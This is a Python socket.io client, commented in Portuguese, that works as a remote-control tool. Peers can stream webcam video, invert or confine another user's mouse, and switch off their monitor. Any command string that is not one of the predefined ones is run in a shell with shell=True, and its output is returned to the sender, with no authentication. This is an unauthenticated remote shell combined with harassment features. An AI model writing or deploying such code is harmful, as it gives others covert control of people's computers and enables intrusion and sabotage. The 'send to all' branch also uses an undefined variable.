import socketio
import os
import subprocess
import ctypes
from pynput.mouse import Controller, Listener
from pynput import mouse
import threading
import cv2
import base64
import time
import numpy as np

# Conectando ao servidor
socketClient = socketio.Client()
mouse = Controller()

is_streaming = False
mouse_limited = False
invert_mouse = False

mouse_bounds = (0, 500, 0, 500)  # Limite da área (x_min, x_max, y_min, y_max)

current_position = mouse.position


def apply_mouse_limit(x, y):
    global mouse_bounds
    x_min, x_max, y_min, y_max = mouse_bounds
    return max(x_min, min(x, x_max)), max(y_min, min(y, y_max))


def invert_mouse_movement(x, y, prev_x, prev_y):
    delta_x = x - prev_x
    delta_y = y - prev_y
    inverted_x = prev_x - delta_x
    inverted_y = prev_y - delta_y
    return inverted_x, inverted_y


def mouse_listener():
    global mouse_limited, invert_mouse, current_position

    def on_move(x, y):
        global mouse_limited, invert_mouse, current_position

        try:
            prev_x, prev_y = current_position

            # Aplica inversão de movimento, se ativada
            if invert_mouse:
                x, y = invert_mouse_movement(x, y, prev_x, prev_y)

            # Aplica limites, se ativados
            if mouse_limited:
                x, y = apply_mouse_limit(x, y)

            # Atualiza a posição do mouse apenas se algo mudou
            if (x, y) != current_position:
                current_position = (x, y)
                mouse.position = current_position

        except Exception as e:
            print(f"Erro no listener de mouse: {e}")

    # Listener do mouse
    try:
        with Listener(on_move=on_move) as listener:
            listener.join()
    except Exception as e:
        print(f"Erro no listener: {e}")

def turn_off_monitor():
    if os.name == "nt":  # windows
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)
    elif os.name == "posix":  # linux
        os.system("xset dpms force off")
    print("Monitor desligado!")
    
# Função para capturar e enviar vídeo da webcam
def start_video_stream(target_id):
    global is_streaming
    is_streaming = True  # Marca que a transmissão está ativa
    
    cap = cv2.VideoCapture(0)  # Abre a webcam

    if not cap.isOpened():
        print("Erro: Não foi possível acessar a webcam.")
        is_streaming = False 
        return

    try:
        while is_streaming:

            ret, frame = cap.read()
            if not ret:
                print("Erro ao capturar o frame da webcam.")
                break
            
            cv2.imshow("Teste de Webcam", frame)
            # Codifica o frame como JPEG
            _, buffer = cv2.imencode('.jpg', frame)
            frame_base64 = base64.b64encode(buffer).decode('utf-8')

            # Envia o frame codificado para o servidor
            socketClient.emit('video_frame', {'target': target_id, 'frame': frame_base64})

            # Aguarda um pouco para não sobrecarregar o envio
            time.sleep(0.03)  # ~30 FPS (ajuste conforme necessário)
            
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

    except KeyboardInterrupt:
        print("Transmissão encerrada pelo usuário.")
    finally:
        cap.release()
        print("Webcam liberada.")
        is_streaming = False
        
        
@socketClient.event
def connect():
    print("Conectado ao servidor!")

@socketClient.event
def disconnect():
    print("Desconectado do servidor.")

@socketClient.on('message')
def on_message(data):
    print(f"Mensagem recebida: {data}")

@socketClient.on('video_frame')
def on_video_frame(data):
    try:
        
        print("Frame recebido do servidor.")

        # Decodifica o frame recebido
        frame_base64 = data['frame']
        frame_bytes = base64.b64decode(frame_base64)
        nparr = np.frombuffer(frame_bytes, np.uint8)
        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

        if frame is None:
            print("Erro: frame não pôde ser decodificado.")
            return
        # Exibe o frame
        cv2.imshow('Transmissão ao Vivo', frame)


        if cv2.waitKey(1) & 0xFF == ord('q'):
            print("Encerrando visualização do vídeo.")
            cv2.destroyAllWindows()
            socketClient.disconnect()
            return
    except Exception as e:
        print(f"Erro ao processar o frame: {e}")

@socketClient.on('execute_command')
def on_execute_command(data):
    global invert_mouse, mouse_limited
    print(f"Comando recebido de {data['from']}: {data['command']}")
    
    command = data['command']

    try:
        if command == "invert_mouse":
            invert_mouse = not invert_mouse
            status = "ativado" if invert_mouse else "desativado"
            print(f"Movimento invertido do mouse {status}.")
            socketClient.emit('send_message', {'target': data['from'], 'message': f"Movimento do mouse {status}."})

        elif command == "limit_mouse":
            mouse_limited = not mouse_limited
            status = "ativado" if mouse_limited else "desativado"
            print(f"Limite de movimento do mouse {status}.")
            socketClient.emit('send_message', {'target': data['from'], 'message': f"Limitação de movimento do mouse {status}."})

        elif command == "turn_off_monitor":
            turn_off_monitor()
            socketClient.emit('send_message', {'target': data['from'], 'message': "Monitor desligado."})

        else:
            process = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            output, error = process.communicate()

            if output:
                print(f"Saída do comando:\n{output}")
                socketClient.emit('send_message', {'target': data['from'], 'message': f"Saída:\n{output}"})
            if error:
                print(f"Erro ao executar o comando:\n{error}")

    except Exception as exception:
        print(f"Erro ao executar o comando: {exception}")

def main():
    
    global is_streaming

    threading.Thread(target=mouse_listener, daemon=True).start()

    socketClient.connect('http://localhost:3000')

    
    while True:
        print("\nOpções:")
        print("1. Enviar mensagem")
        print("2. Enviar comando")
        print("3. Enviar comando pré-definido")
        
        if is_streaming:
            print("4. Parar transmissão de vídeo")
        else:
            print("4. Iniciar transmissão de vídeo")


        choice = input("Escolha: ")
        # enviar Mensagem
        if choice == '1':
            print("\nMensagem para :")
            print ('1. ID específico')
            print ('2. Para todos')
            targetChoice = input("Escolha: ")

            if targetChoice == '1':
                    target = input("Informe o ID: ")
                    message = input("Mensagem: ")
                    socketClient.emit('send_message', {'target': target, 'message': message})
            elif targetChoice == '2':
                    message = input("Mensagem: ")
                    socketClient.emit('send_message', {'target': target, 'message': message})
            else:
                    print("Opção Inválida!")
                    
         # enviar Comando para o terminal
        elif choice == '2':
            target = input("Enviar comando para (ID): ")
            command = input("Comando: ")
            socketClient.emit('send_command', {'target': target, 'command': command})
            
        # enviar Comandos pré programados para o terminal
        elif choice == '3':
            print("\nComandos pré-definidos:")
            print("1. Inverter movimento do mouse (invert_mouse)")
            print("2. Limitar movimento do mouse (limit_mouse)")
            print("3. Desligar monitor (turn_off_monitor)")
            predefined_choice = input("Escolha: ")

            target = input("Enviar comando para (ID): ")
            if predefined_choice == '1':
                command = "invert_mouse"
            elif predefined_choice == '2':
                command = "limit_mouse"
            elif predefined_choice == '3':
                command = "turn_off_monitor"
            else:
                print("Opção inválida!")
                continue

            socketClient.emit('send_command', {'target': target, 'command': command})

        # enviar frames de video/ parar de ennviar
        elif choice == '4':
            if is_streaming:
                # parar a transmissão
                print("Encerrando transmissão de vídeo...")
                is_streaming = False
            else:
                # iniciar a transmissão
                target = input("Enviar transmissão de vídeo para (ID): ")
                threading.Thread(target=start_video_stream, args=(target,), daemon=True).start()

        else:
            print("Opção inválida!")

if __name__ == "__main__":
    main()
